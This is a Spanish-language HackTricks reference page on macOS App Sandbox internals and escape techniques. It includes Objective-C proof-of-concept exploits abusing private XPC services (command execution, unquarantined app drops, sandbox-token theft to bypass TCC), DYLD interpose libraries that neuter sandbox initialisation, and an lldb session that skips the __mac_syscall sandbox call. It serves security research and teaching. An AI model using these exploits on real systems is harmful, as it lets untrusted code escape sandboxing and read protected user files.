# macOS Sandbox Debug & Bypass

{{#include ../../../../../banners/hacktricks-training.md}}

## Proceso de carga del sandbox

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Imagen de <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

En la imagen anterior se puede observar **cómo se cargará el sandbox** cuando se ejecuta una aplicación con el entitlement **`com.apple.security.app-sandbox`**.

El compilador enlazará `/usr/lib/libSystem.B.dylib` al binario.

Después, **`libSystem.B`** llama a varias funciones hasta que **`xpc_pipe_routine`** envía los entitlements de la aplicación a **`securityd`**. Securityd comprueba si el proceso debe ser puesto en cuarentena dentro del sandbox y, en ese caso, lo pone en cuarentena.\
Finalmente, el sandbox se activa mediante una llamada a **`__sandbox_ms`**, que llama a **`__mac_syscall`**.<sup>[[1]](#references)[[3]](#references)</sup>

## Posibles Bypasses

### Bypassing quarantine attribute

A los **archivos creados por procesos sandboxed** se les añade el **quarantine attribute** para evitar escapes del sandbox: si depositas una nueva aplicación e intentas ejecutarla, el flag de cuarentena lo impide. Por lo tanto, **si puedes depositar un archivo o carpeta *sin* el quarantine attribute, puedes escapar del App Sandbox**; simplemente deposita un bundle `.app` y ejecútalo con `open`, ya que el proceso recién iniciado se ejecuta bajo LaunchServices y no bajo tu sandbox.

La forma fiable de conseguir un **drop sin cuarentena** es pedirle a **otro proceso que cree el archivo por ti**. Tal como se documenta en [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) por Mickey Jin, el **App Sandbox** marca los archivos depositados con quarantine, pero los servicios XPC que se ejecutan bajo el Service Sandbox no lo hacen. Por lo tanto, varios servicios XPC no autenticados podían utilizarse como primitive de "quarantine laundering":<sup>[[4]](#references)</sup>

- **CVE-2023-27944** (`TrialArchivingService`) y **CVE-2023-32414** (`ArchiveService`): extraen un archivo enviado por una app sandboxed a una ubicación elegida **sin propagar el quarantine xattr** al contenido extraído.
- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): el path traversal en `submitSignpostDataWithConfig:` permitía crear **directorios arbitrarios sin quarantine**, lo que basta para construir la estructura completa de un bundle `.app` fuera del container.
- **CVE-2024-27864** (`diskimagescontroller.xpc`): adjunta un DMG en cuarentena **sin poner en cuarentena el dispositivo resultante**, por lo que las aplicaciones del volumen montado se pueden ejecutar.

> [!TIP]
> La extracción normalmente **elimina el bit de permiso de ejecución**. El workaround utilizado en CVE-2023-27944 consistía en colocar un **symlink** a un binario del sistema firmado existente (por ejemplo, `/System/Library/CoreServices/Automator Application Stub`) como ejecutable principal del bundle, lo que permite ejecutarlo sin necesitar `+x` en un archivo depositado.

> [!CAUTION]
> Esto funciona porque la comprobación se basa en el **flag del elemento que se está ejecutando**: *"When an app or other executable code is run from the Finder or GUI, macOS checks its quarantine flag before loading it"*, y solo entonces *"it's handed over to Gatekeeper for full 'first run' security checks"* ([Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)). Si no hay ningún flag en el bundle que ejecutas, no hay comprobación de Gatekeeper, que es exactamente la primitive que proporcionan los CVE anteriores.<sup>[[5]](#references)</sup>
>
> Ten en cuenta que, si un bundle `.app` ya ha sido autorizado para ejecutarse (tiene un quarantine xattr con el flag "authorized to run" activado), también podrías abusar de él... excepto que ahora no puedes escribir dentro de los bundles **`.app`** a menos que tengas algunos permisos privilegiados de TCC (que no tendrás dentro de un sandbox).

### Abusing Open functionality

En los [**últimos ejemplos de Word sandbox bypass**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) se puede apreciar cómo se podría abusar de la funcionalidad de la CLI **`open`** para realizar un bypass del sandbox.


{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

Aunque una aplicación **esté destinada a ejecutarse en un sandbox** (`com.apple.security.app-sandbox`), es posible hacer que evite el sandbox si, por ejemplo, se **ejecuta desde un LaunchAgent** (`~/Library/LaunchAgents`).\
Tal como se explica en [**esta publicación**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), si quieres conseguir persistencia con una aplicación que está sandboxed, podrías hacer que se ejecute automáticamente como un LaunchAgent y quizá inyectar código malicioso mediante variables de entorno de DyLib.<sup>[[6]](#references)</sup>

### Abusing Auto Start Locations

Si un proceso sandboxed puede **escribir** en un lugar donde **posteriormente una aplicación unsandboxed va a ejecutar el binario**, podrá **escapar simplemente colocando** allí el binario. Un buen ejemplo de este tipo de ubicaciones son `~/Library/LaunchAgents` o `/System/Library/LaunchDaemons`.

Para ello incluso podrías necesitar **2 pasos**: hacer que un proceso con un **sandbox más permisivo** (`file-read*`, `file-write*`) ejecute tu código, que será el encargado de escribir en un lugar donde se **ejecutará sin sandbox**.

Consulta esta página sobre las **ubicaciones de Auto Start**:


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Abusing other processes

Si desde el proceso sandboxed eres capaz de **comprometer otros procesos** que se ejecutan en sandboxes menos restrictivos (o en ninguno), podrás escapar a sus sandboxes:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Available System and User Mach services

El sandbox también permite comunicarse con determinados **servicios Mach** mediante XPC definidos en el perfil `application.sb`. Si eres capaz de **abusar** de uno de estos servicios, podrías **escapar del sandbox**.

Tal como se indica en [este writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), la información sobre los servicios Mach se almacena en `/System/Library/xpc/launchd.plist`. Es posible encontrar todos los servicios Mach de System y User buscando dentro de ese archivo `<string>System</string>` y `<string>User</string>`.<sup>[[4]](#references)</sup>

Además, es posible comprobar si un servicio Mach está disponible para una aplicación sandboxed llamando a `bootstrap_look_up`:
```objectivec
void checkService(const char *serviceName) {
mach_port_t service_port = MACH_PORT_NULL;
kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
if (!err) {
NSLog(@"available service:%s", serviceName);
mach_port_deallocate(mach_task_self_, service_port);
}
}

void print_available_xpc(void) {
NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
for (NSString* key in launchDaemons) {
NSDictionary<NSString*, id>* job = launchDaemons[key];
NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
for (NSString* serviceName in machServices) {
checkService(serviceName.UTF8String);
}
}
}
```
### Servicios Mach PID disponibles

Estos servicios Mach fueron utilizados inicialmente para [escapar del sandbox en este writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). En ese momento, **todos los servicios XPC requeridos** por una aplicación y su framework eran visibles en el dominio PID de la aplicación (son servicios Mach con `ServiceType` como `Application`).<sup>[[4]](#references)</sup>

Para **contactar con un servicio XPC de un dominio PID**, solo es necesario registrarlo dentro de la aplicación con una línea como:
```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```
Además, es posible encontrar todos los servicios Mach de **Application** buscando `<string>Application</string>` dentro de `System/Library/xpc/launchd.plist`.

Otra forma de encontrar servicios xpc válidos es comprobar los que se encuentran en:
```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```
Varios ejemplos que abusan de esta técnica se pueden encontrar en el [**writeup original**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/); sin embargo, los siguientes son algunos ejemplos resumidos.<sup>[[4]](#references)</sup>

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

Este servicio permite todas las conexiones XPC al devolver siempre `YES`, y el método `runTask:arguments:withReply:` ejecuta un comando arbitrario con parámetros arbitrarios.

El exploit era «tan simple como»:
```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
[conn resume];

[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
NSLog(@"run task result:%@, error:%@", bSucc, error);
}];
}
```
#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

Este servicio XPC permitía cualquier cliente al devolver siempre `YES`, y el método `createZipAtPath:hourThreshold:withReply:` aceptaba la ruta a una carpeta y la comprimía en un archivo ZIP.

Por lo tanto, era posible generar una estructura de carpetas de una aplicación falsa, comprimirla, descomprimirla y ejecutarla para escapar del sandbox, ya que los archivos nuevos no tendrían el atributo de cuarentena.

El exploit era:
```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
NSString *currentPath = NSTemporaryDirectory();
chdir([currentPath UTF8String]);
NSLog(@"======== preparing payload at the current path:%@", currentPath);
system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
system("chmod +x compressed/poc.app/Contents/MacOS/poc");

[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
[conn resume];

[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
NSString *file;
while ((file = [dirEnum nextObject])) {
if ([[file pathExtension] isEqualToString: @"zip"]) {
// open the zip
NSString *cmd = [@"open " stringByAppendingString:file];
system([cmd UTF8String]);

sleep(3); // wait for decompression and then open the payload (poc.app)
NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
system([cmd2 UTF8String]);
break;
}
}
}];
}
```
#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

Este XPC service permite otorgar acceso de lectura y escritura a una URL arbitraria al cliente XPC mediante el método `extendAccessToURL:completion:`, que aceptaba cualquier conexión. Como el XPC service tiene FDA, es posible abusar de estos permisos para omitir TCC por completo.

El exploit consistía en:
```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
[conn resume];

[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
NSURL *targetURL = [fpWrapper url];

void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
else {
NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
}
}];
}
```
### Compilación estática y enlazado dinámico

[**Esta investigación**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) descubrió 2 formas de bypass del Sandbox. Debido a que el sandbox se aplica desde userland cuando se carga la biblioteca **libSystem**. Si un binario pudiera evitar cargarla, nunca entraría en el sandbox:<sup>[[2]](#references)</sup>

- Si el binario se compilara **completamente de forma estática**, podría evitar cargar esa biblioteca.
- Si el **binario no necesitara cargar ninguna biblioteca** (porque el linker también está en libSystem), no necesitaría cargar libSystem.

### Shellcodes

Ten en cuenta que incluso los **shellcodes** en ARM64 necesitan enlazarse con `libSystem.dylib`:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Restricciones no heredadas

Como se explica en el **[bonus de este writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**, una restricción del sandbox como:<sup>[[4]](#references)</sup>
```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```
puede ser evadido por un nuevo proceso que se ejecute, por ejemplo:
```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```
Sin embargo, por supuesto, este nuevo proceso no heredará los entitlements ni los privilegios del proceso padre.

### Entitlements

Ten en cuenta que, aunque algunas **acciones** podrían estar **permitidas por el sandbox** si una aplicación tiene un **entitlement** específico, como en:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Bypass

Para obtener más información sobre **Interposting**, consulta:


{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Interpost `_libsecinit_initializer` para evitar el sandbox
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interponer `__mac_syscall` para impedir el Sandbox
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Depurar y evadir Sandbox con lldb

Let's compile an application that should be sandboxed:

{{#tabs}}
{{#tab name="sand.c"}}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{{#endtab}}

{{#tab name="entitlements.xml"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="Info.plist"}}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

Después, compila la app:
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
> [!CAUTION]
> La aplicación intentará **leer** el archivo **`~/Desktop/del.txt`**, algo que el **Sandbox no permitirá**.\
> Crea un archivo allí, ya que, una vez que se omita el Sandbox, podrá leerlo:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Depuremos la aplicación para ver cuándo se carga el Sandbox:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
> [!WARNING] > **Incluso con el Sandbox evadido, TCC** preguntará al usuario si desea permitir que el proceso lea archivos del escritorio

## References

- [1] [Jonathan Levin - El Apple Sandbox: Profundizando en el atolladero (diapositivas de HITB GSEC 2016)](http://newosxbook.com/files/HITSB.pdf)
- [2] [Saagar Jha - Escape del Sandbox de Mac App Store](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [3] [Jonathan Levin - El Apple Sandbox: Profundizando en el atolladero (HITB GSEC 2016)](https://www.youtube.com/watch?v=mG715HcDgO8)
- [4] [Mickey Jin - Una nueva era de los Sandbox Escapes de macOS](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
- [5] [The Eclectic Light Company - Explicación: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): macOS TCC Bypass w/ Telegram using DyLib Injection (Part 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
{{#include ../../../../../banners/hacktricks-training.md}}
